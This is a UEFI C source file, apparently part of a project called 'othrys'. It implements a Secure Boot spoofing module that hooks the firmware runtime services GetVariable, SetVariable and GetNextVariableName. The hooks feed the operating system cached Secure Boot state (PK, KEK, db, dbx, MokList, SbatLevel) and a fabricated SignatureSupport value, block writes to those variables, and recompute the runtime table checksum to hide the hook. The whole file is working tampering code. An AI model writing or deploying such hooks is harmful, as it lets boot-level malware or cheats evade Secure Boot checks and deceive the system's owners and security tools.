#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/BaseLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Guid/GlobalVariable.h>
#include <Guid/ImageAuthentication.h>
#include "othrys_types.h"
#include "sb_variables.h"

#define SECURE_BOOT_VARIABLE_NAME       L"SecureBoot"
#define SETUP_MODE_VARIABLE_NAME        L"SetupMode"
#define AUDIT_MODE_VARIABLE_NAME        L"AuditMode"
#define DEPLOYED_MODE_VARIABLE_NAME     L"DeployedMode"
#define CUSTOM_MODE_VARIABLE_NAME      L"CustomMode"
#define SIGNATURE_SUPPORT_VARIABLE_NAME L"SignatureSupport"
#define PK_VARIABLE_NAME                L"PK"
#define KEK_VARIABLE_NAME               L"KEK"
#define DB_VARIABLE_NAME                L"db"
#define DBX_VARIABLE_NAME               L"dbx"
#define DBT_VARIABLE_NAME               L"dbt"
#define DBR_VARIABLE_NAME               L"dbr"
#define MOK_LIST_VARIABLE_NAME          L"MokList"
#define SBAT_LEVEL_VARIABLE_NAME        L"SbatLevel"

#define EFI_VAR_ATTR_BS_RT_NV \
    (EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS | EFI_VARIABLE_NON_VOLATILE)
#define EFI_VAR_ATTR_BS_RT_NV_TBA \
    (EFI_VAR_ATTR_BS_RT_NV | EFI_VARIABLE_TIME_BASED_AUTHENTICATED_WRITE_ACCESS)

static EFI_GET_VARIABLE           OriginalGetVariable           = NULL;
static EFI_SET_VARIABLE           OriginalSetVariable           = NULL;
static EFI_GET_NEXT_VARIABLE_NAME OriginalGetNextVariableName   = NULL;
static BOOLEAN gSecureBootSpoofActive = FALSE;

static EFI_GUID gShimLockGuid = {
    0x605DAB50, 0xE046, 0x4300,
    { 0xAB, 0xB6, 0x3D, 0xD8, 0x10, 0xDD, 0x8B, 0x23 }
};

typedef struct {
    const UINT8 *Data;
    UINTN         Size;
    UINT32        Attributes;
} SB_VAR_ENTRY;

static SB_VAR_ENTRY gSecureBootEntry;
static SB_VAR_ENTRY gSetupModeEntry;
static SB_VAR_ENTRY gAuditModeEntry;
static SB_VAR_ENTRY gDeployedModeEntry;
static SB_VAR_ENTRY gCustomModeEntry;
static SB_VAR_ENTRY gPkEntry;
static SB_VAR_ENTRY gKekEntry;
static SB_VAR_ENTRY gDbEntry;
static SB_VAR_ENTRY gDbxEntry;
static SB_VAR_ENTRY gDbtEntry;
static SB_VAR_ENTRY gDbrEntry;
static SB_VAR_ENTRY gMokListEntry;
static SB_VAR_ENTRY gSbatLevelEntry;

static UINT8  gFakeSignatureSupport[sizeof(EFI_GUID) * 4];
static UINTN  gFakeSignatureSupportSize = sizeof(gFakeSignatureSupport);

static BOOLEAN
IsVarName (
    CHAR16 *VarName,
    CHAR16 *Target
)
{
    return StrCmp(VarName, Target) == 0;
}

static EFI_STATUS
ReturnVarEntry (
    SB_VAR_ENTRY *Entry,
    UINT32        *Attributes OPTIONAL,
    UINTN         *DataSize,
    VOID          *Data OPTIONAL
)
{
    if (*DataSize < Entry->Size) {
        *DataSize = Entry->Size;
        return EFI_BUFFER_TOO_SMALL;
    }
    *DataSize = Entry->Size;
    if (Attributes) *Attributes = Entry->Attributes;
    if (Data && Entry->Size > 0) {
        CopyMem(Data, Entry->Data, Entry->Size);
    }
    return EFI_SUCCESS;
}

static VOID
InitSignatureSupport (
    VOID
)
{
    EFI_GUID *Guids = (EFI_GUID *)gFakeSignatureSupport;
    
    EFI_GUID gSha256   = { 0xc5c49644, 0x6521, 0x4757, { 0x91, 0x7b, 0xe1, 0xb9, 0xa9, 0x03, 0x5d, 0xd3 }};
    EFI_GUID gRsa2048  = { 0x3c5766e2, 0x6948, 0x404a, { 0xb1, 0x06, 0xb1, 0xe2, 0x85, 0x8e, 0x50, 0xf2 }};
    EFI_GUID gX509     = { 0xa5c059d1, 0xf9f7, 0x4e55, { 0x91, 0x66, 0x5e, 0x23, 0x3f, 0x1c, 0xeb, 0xdc }};
    EFI_GUID gPkcs7    = { 0x4aafd29d, 0xc7d5, 0x4e91, { 0x8a, 0x91, 0xf1, 0x79, 0x33, 0x8c, 0x5d, 0xf4 }};

    CopyMem(&Guids[0], &gSha256,   sizeof(EFI_GUID));
    CopyMem(&Guids[1], &gRsa2048,  sizeof(EFI_GUID));
    CopyMem(&Guids[2], &gX509,     sizeof(EFI_GUID));
    CopyMem(&Guids[3], &gPkcs7,    sizeof(EFI_GUID));
}

static SB_VAR_ENTRY*
FindVarEntry (
    CHAR16   *VariableName,
    EFI_GUID *VendorGuid
)
{
    if (CompareGuid(VendorGuid, &gEfiGlobalVariableGuid)) {
        if (IsVarName(VariableName, SECURE_BOOT_VARIABLE_NAME))       return &gSecureBootEntry;
        if (IsVarName(VariableName, SETUP_MODE_VARIABLE_NAME))        return &gSetupModeEntry;
        if (IsVarName(VariableName, AUDIT_MODE_VARIABLE_NAME))        return &gAuditModeEntry;
        if (IsVarName(VariableName, DEPLOYED_MODE_VARIABLE_NAME))     return &gDeployedModeEntry;
        if (IsVarName(VariableName, CUSTOM_MODE_VARIABLE_NAME))       return &gCustomModeEntry;
        if (IsVarName(VariableName, PK_VARIABLE_NAME))                return &gPkEntry;
        if (IsVarName(VariableName, KEK_VARIABLE_NAME))               return &gKekEntry;
        if (IsVarName(VariableName, SIGNATURE_SUPPORT_VARIABLE_NAME)) return NULL;
    }

    if (CompareGuid(VendorGuid, &gEfiImageSecurityDatabaseGuid)) {
        if (IsVarName(VariableName, DB_VARIABLE_NAME))   return &gDbEntry;
        if (IsVarName(VariableName, DBX_VARIABLE_NAME))  return &gDbxEntry;
        if (IsVarName(VariableName, DBT_VARIABLE_NAME))  return &gDbtEntry;
        if (IsVarName(VariableName, DBR_VARIABLE_NAME))  return &gDbrEntry;
    }

    if (CompareGuid(VendorGuid, &gShimLockGuid)) {
        if (IsVarName(VariableName, MOK_LIST_VARIABLE_NAME))     return &gMokListEntry;
        if (IsVarName(VariableName, SBAT_LEVEL_VARIABLE_NAME))   return &gSbatLevelEntry;
    }

    return NULL;
}

static BOOLEAN
IsProtectedVariable (
    CHAR16   *VariableName,
    EFI_GUID *VendorGuid
)
{
    if (CompareGuid(VendorGuid, &gEfiGlobalVariableGuid)) {
        if (IsVarName(VariableName, SECURE_BOOT_VARIABLE_NAME))   return TRUE;
        if (IsVarName(VariableName, SETUP_MODE_VARIABLE_NAME))    return TRUE;
        if (IsVarName(VariableName, AUDIT_MODE_VARIABLE_NAME))    return TRUE;
        if (IsVarName(VariableName, DEPLOYED_MODE_VARIABLE_NAME)) return TRUE;
        if (IsVarName(VariableName, CUSTOM_MODE_VARIABLE_NAME))   return TRUE;
        if (IsVarName(VariableName, PK_VARIABLE_NAME))            return TRUE;
        if (IsVarName(VariableName, KEK_VARIABLE_NAME))           return TRUE;
    }
    if (CompareGuid(VendorGuid, &gEfiImageSecurityDatabaseGuid)) {
        if (IsVarName(VariableName, DB_VARIABLE_NAME))   return TRUE;
        if (IsVarName(VariableName, DBX_VARIABLE_NAME))  return TRUE;
        if (IsVarName(VariableName, DBT_VARIABLE_NAME))  return TRUE;
        if (IsVarName(VariableName, DBR_VARIABLE_NAME))  return TRUE;
    }
    if (CompareGuid(VendorGuid, &gShimLockGuid)) {
        if (IsVarName(VariableName, MOK_LIST_VARIABLE_NAME))     return TRUE;
        if (IsVarName(VariableName, SBAT_LEVEL_VARIABLE_NAME))   return TRUE;
    }
    return FALSE;
}

static EFI_STATUS
EFIAPI
HookedGetVariable (
    IN     CHAR16    *VariableName,
    IN     EFI_GUID  *VendorGuid,
    OUT    UINT32    *Attributes OPTIONAL,
    IN OUT UINTN     *DataSize,
    OUT    VOID      *Data OPTIONAL
)
{
    if (!gSecureBootSpoofActive) {
        return OriginalGetVariable(VariableName, VendorGuid, Attributes, DataSize, Data);
    }

    if (CompareGuid(VendorGuid, &gEfiGlobalVariableGuid) &&
        IsVarName(VariableName, SIGNATURE_SUPPORT_VARIABLE_NAME))
    {
        if (*DataSize < gFakeSignatureSupportSize) {
            *DataSize = gFakeSignatureSupportSize;
            return EFI_BUFFER_TOO_SMALL;
        }
        *DataSize = gFakeSignatureSupportSize;
        if (Attributes) *Attributes = EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS;
        if (Data) CopyMem(Data, gFakeSignatureSupport, gFakeSignatureSupportSize);
        return EFI_SUCCESS;
    }

    SB_VAR_ENTRY *Entry = FindVarEntry(VariableName, VendorGuid);
    if (Entry) {
        return ReturnVarEntry(Entry, Attributes, DataSize, Data);
    }

    return OriginalGetVariable(VariableName, VendorGuid, Attributes, DataSize, Data);
}

static EFI_STATUS
EFIAPI
HookedSetVariable (
    IN CHAR16   *VariableName,
    IN EFI_GUID *VendorGuid,
    IN UINT32    Attributes,
    IN UINTN     DataSize,
    IN VOID     *Data
)
{
    if (gSecureBootSpoofActive && IsProtectedVariable(VariableName, VendorGuid)) {
        return EFI_WRITE_PROTECTED;
    }
    return OriginalSetVariable(VariableName, VendorGuid, Attributes, DataSize, Data);
}

static EFI_STATUS
EFIAPI
HookedGetNextVariableName (
    IN OUT UINTN    *VariableNameSize,
    IN OUT CHAR16   *VariableName,
    IN OUT EFI_GUID *VendorGuid
)
{
    return OriginalGetNextVariableName(VariableNameSize, VariableName, VendorGuid);
}

static VOID
CopyToRuntime (
    SB_VAR_ENTRY  *Entry,
    const UINT8   *SrcData,
    UINTN          SrcSize,
    UINT32         Attr
)
{
    Entry->Size = SrcSize;
    Entry->Attributes = Attr;
    if (SrcSize > 0) {
        Entry->Data = AllocateRuntimePool(SrcSize);
        if (Entry->Data) {
            CopyMem((VOID *)Entry->Data, SrcData, SrcSize);
        }
    } else {
        Entry->Data = NULL;
    }
}

EFI_STATUS
InstallSecureBootSpoof (
    VOID
)
{
    InitSignatureSupport();

    CopyToRuntime(&gSecureBootEntry,  g_RealSecureBoot,   g_RealSecureBootSize,   EFI_VAR_ATTR_BS_RT_NV);
    CopyToRuntime(&gSetupModeEntry,   g_RealSetupMode,    g_RealSetupModeSize,    EFI_VAR_ATTR_BS_RT_NV);
    CopyToRuntime(&gAuditModeEntry,   g_RealAuditMode,    g_RealAuditModeSize,    EFI_VAR_ATTR_BS_RT_NV);
    CopyToRuntime(&gDeployedModeEntry,g_RealDeployedMode, g_RealDeployedModeSize, EFI_VAR_ATTR_BS_RT_NV);
    CopyToRuntime(&gCustomModeEntry,  g_RealCustomMode,   g_RealCustomModeSize,   EFI_VAR_ATTR_BS_RT_NV);

    CopyToRuntime(&gPkEntry,  g_RealPK,  g_RealPKSize,  EFI_VAR_ATTR_BS_RT_NV_TBA);
    CopyToRuntime(&gKekEntry, g_RealKEK, g_RealKEKSize, EFI_VAR_ATTR_BS_RT_NV_TBA);
    CopyToRuntime(&gDbEntry,  g_RealDb,  g_RealDbSize,  EFI_VAR_ATTR_BS_RT_NV_TBA);
    CopyToRuntime(&gDbxEntry, g_RealDbx, g_RealDbxSize, EFI_VAR_ATTR_BS_RT_NV_TBA);
    CopyToRuntime(&gDbtEntry, g_RealDbt, g_RealDbtSize, EFI_VAR_ATTR_BS_RT_NV_TBA);
    CopyToRuntime(&gDbrEntry, g_RealDbr, g_RealDbrSize, EFI_VAR_ATTR_BS_RT_NV_TBA);

    CopyToRuntime(&gMokListEntry,   g_RealMokList,   g_RealMokListSize,   EFI_VAR_ATTR_BS_RT_NV);
    CopyToRuntime(&gSbatLevelEntry, g_RealSbatLevel, g_RealSbatLevelSize, EFI_VAR_ATTR_BS_RT_NV);

    OriginalGetVariable           = gRT->GetVariable;
    OriginalSetVariable           = gRT->SetVariable;
    OriginalGetNextVariableName   = gRT->GetNextVariableName;

    gRT->GetVariable           = HookedGetVariable;
    gRT->SetVariable           = HookedSetVariable;
    gRT->GetNextVariableName   = HookedGetNextVariableName;

    gRT->Hdr.CRC32 = 0;
    gBS->CalculateCrc32(&gRT->Hdr, gRT->Hdr.HeaderSize, &gRT->Hdr.CRC32);

    gSecureBootSpoofActive = TRUE;
    return EFI_SUCCESS;
}

EFI_STATUS
RestoreSecureBootSpoof (
    VOID
)
{
    gSecureBootSpoofActive = FALSE;

    gRT->GetVariable           = OriginalGetVariable;
    gRT->SetVariable           = OriginalSetVariable;
    gRT->GetNextVariableName   = OriginalGetNextVariableName;

    gRT->Hdr.CRC32 = 0;
    gBS->CalculateCrc32(&gRT->Hdr, gRT->Hdr.HeaderSize, &gRT->Hdr.CRC32);

    return EFI_SUCCESS;
}